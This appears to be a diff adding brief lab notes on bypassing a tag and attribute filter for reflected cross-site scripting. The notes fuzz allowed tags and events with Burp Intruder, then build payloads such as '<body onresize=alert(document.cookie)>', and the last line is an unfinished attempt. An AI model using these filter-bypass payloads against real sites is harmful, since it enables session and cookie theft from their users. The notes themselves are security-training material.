@@ -1,0 +1,16 @@
+in burp copy all tags to intruder from brup cheatsheet spot   
+`GET /?search=<§§> HTTP/1.1`     
+
+body tag came back with 200 status     
+`GET /?search=<body> HTTP/1.1`   
+
+so make this `GET /?search=<body%20§§=1> HTTP/1.1`    
+then copy only the events into intruder again 
+
+onresize gives us a 200 status 
+`GET /?search=<body%20onresize=1> HTTP/1.1`    
+
+so the payload mus be something like   
+`<body onresize=alert(document.cookie)>` now we have to mkae it work...
+
+"><body onresize=alert(document.cookie)>" onload=this.style.width='100px'> 
